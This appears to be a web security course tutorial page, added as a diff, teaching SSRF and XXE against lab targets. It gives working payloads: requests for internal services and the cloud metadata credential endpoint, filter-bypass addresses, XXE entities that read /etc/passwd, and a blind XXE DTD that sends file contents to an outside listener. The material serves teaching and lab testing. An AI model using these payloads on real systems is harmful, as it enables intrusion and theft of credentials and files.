@@ -1,0 +1,178 @@
+---
+title: "Tut05: SSRF & XXE"
+---
+
+Server-Side Request Forgery (SSRF) and XML External Entity (XXE) injection are two server-side vulnerabilities that can expose internal infrastructure and sensitive files. Both require the server to make a request or parse content on behalf of the attacker.
+
+## Server-Side Request Forgery (SSRF)
+
+SSRF tricks the server into making HTTP requests to locations chosen by the attacker. Because the request originates from the server, it can reach:
+
+- Internal services not exposed to the internet (admin panels, metadata APIs).
+- Other machines on the internal network.
+- The server's own localhost services.
+
+### Identifying SSRF
+
+Look for parameters that contain URLs or hostnames:
+
+```
+https://target.lab/fetch?url=https://example.com
+https://target.lab/import?src=http://cdn.example.com/image.jpg
+https://target.lab/webhook?endpoint=https://notify.example.com
+```
+
+### Basic SSRF Test
+
+Replace the parameter with your own server:
+
+```sh
+# Start a listener
+python3 -m http.server 8000
+
+# Trigger the request
+curl "https://target.lab/fetch?url=http://192.168.1.5:8000/test"
+```
+
+If your listener receives a request, SSRF is confirmed.
+
+### Reaching Internal Services
+
+```
+# Access localhost services
+http://127.0.0.1:8080/admin
+http://localhost/internal-api/users
+
+# Access cloud metadata (AWS)
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# Access other internal hosts
+http://10.0.0.5/secret-panel
+```
+
+The AWS metadata endpoint is especially valuable on cloud instances—it can return IAM credentials that grant access to the cloud account.
+
+### Protocol Handlers
+
+Beyond HTTP, some applications support other protocols:
+
+```
+file:///etc/passwd       -- read local files
+dict://localhost:11211/  -- interact with memcached
+gopher://localhost:25/   -- send raw TCP (SMTP)
+ftp://internal.host/
+```
+
+### Bypassing SSRF Filters
+
+Applications sometimes block `localhost` or `127.0.0.1` but can be bypassed:
+
+```
+http://0.0.0.0/
+http://[::1]/
+http://127.1/
+http://0177.0.0.1/          (octal)
+http://2130706433/           (decimal IP)
+http://attacker.com          (DNS that resolves to 127.0.0.1)
+```
+
+Use Burp Collaborator or [canarytokens.org](https://canarytokens.org) to detect out-of-band SSRF where the response is not returned to you.
+
+---
+
+## XML External Entity (XXE) Injection
+
+XXE occurs when an application parses XML input and the XML parser is configured to process external entity references. An attacker can use external entities to:
+
+- Read arbitrary files from the server's filesystem.
+- Make server-side requests (similar to SSRF).
+- Cause denial of service (billion laughs attack).
+
+### Identifying XXE
+
+Look for any input that is parsed as XML:
+
+- File upload endpoints that accept `.xml`, `.docx`, `.xlsx`, `.svg`.
+- API endpoints with `Content-Type: application/xml` or `text/xml`.
+- SOAP web services.
+
+### Basic XXE: File Read
+
+Replace the XML body with an external entity declaration:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>
+  <data>&xxe;</data>
+</root>
+```
+
+If the application reflects the value of `<data>` in its response, you will see the contents of `/etc/passwd`.
+
+### XXE to SSRF
+
+Use `http://` instead of `file://` to make an internal request:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
+]>
+<root><data>&xxe;</data></root>
+```
+
+### Blind XXE (Out-of-Band)
+
+When the application does not reflect the entity value, exfiltrate via DNS or HTTP:
+
+Host a malicious DTD file on your server (`/xxe.dtd`):
+
+```xml
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % oob "<!ENTITY exfil SYSTEM 'http://192.168.1.5:8000/?data=%file;'>">
+%oob;
+```
+
+Submit XML that fetches your DTD:
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY % remote SYSTEM "http://192.168.1.5:8000/xxe.dtd">
+  %remote;
+]>
+<root>&exfil;</root>
+```
+
+Your HTTP listener receives the file contents as a query parameter.
+
+### Testing SVG Upload for XXE
+
+SVG files are XML. Many image upload endpoints accept SVG:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/hostname">
+]>
+<svg xmlns="http://www.w3.org/2000/svg" width="300" height="300">
+  <text x="0" y="15">&xxe;</text>
+</svg>
+```
+
+Upload this as an image. If the application renders it server-side (e.g., converts to PNG), the entity is expanded and the result appears in the image.
+
+## Task
+
+> **[Task]** Set up a local SSRF lab (PortSwigger Web Security Academy has free SSRF labs). Confirm SSRF by making the server reach your listener. Try to access `http://localhost/admin` or `http://169.254.169.254/`. For XXE, use any endpoint that parses XML in your lab application and attempt to read `/etc/passwd`. Record every payload and response.
+
+## Reference
+
+- [PortSwigger Web Security Academy - SSRF](https://portswigger.net/web-security/ssrf)
+- [PortSwigger Web Security Academy - XXE](https://portswigger.net/web-security/xxe)
+- [PayloadsAllTheThings - SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
+- [PayloadsAllTheThings - XXE](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
